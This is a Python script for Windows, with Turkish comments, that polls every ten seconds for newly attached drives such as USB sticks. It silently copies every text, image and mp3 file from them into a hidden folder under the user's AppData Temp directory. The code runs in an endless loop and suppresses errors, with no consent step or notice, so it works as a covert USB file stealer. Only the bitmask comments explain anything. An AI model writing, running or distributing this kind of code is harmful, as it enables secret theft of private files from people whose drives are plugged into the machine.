from ctypes import windll
import string
import time
import os
import shutil


def surucu_bul():

    bitmask = windll.kernel32.GetLogicalDrives()  #0bxxxxx 5bitlik sayı döner  0bEDCBA      

    suruculer = list()

    for harf in string.ascii_uppercase:

        if bitmask & 1:    #dec(1)=(bin)00001

            suruculer.append(harf)

        bitmask >>= 1

    return suruculer



#surucu_bul fonksiyonu

#bitmask olayı
#   10100 = bitmask      A için
#   00001 = 1
# & 00000 = 0

#   01010 = bitmask      B için
#   00001 = 2
# & 00000 = 0
 
#   00101 = bitmask      C için 
#   00001 = 1
# & 00001 = true -->     C://









kullanıcıadı = os.getlogin()

if not os.path.exists("C:/Users/"+kullanıcıadı+"/Appdata/Local/Temp/deneme"):

    os.mkdir("C:/Users/"+kullanıcıadı+"/Appdata/Local/Temp/deneme")


while True:

    try:

        ilk = surucu_bul()

        time.sleep(10)

        ikinci = surucu_bul()

        if len(ikinci) > len(ilk):

            usb_suruculer = set(ikinci) - set(ilk)

            for surucu in usb_suruculer:

                for ky,ki,di in os.walk(surucu+":/"):  # ky -- >klasör yolu      ki --> klasör ismi      di --> dosya ismi

                    for x in di:

                        if x.endswith(".txt") or x.endswith(".jpg") or x.endswith(".png") or x.endswith("mp3"):

                            shutil.copy(ky+"/"+x,"C:/Users/"+kullanıcıadı+"/Appdata/Local/Temp/deneme")
    except:

        pass





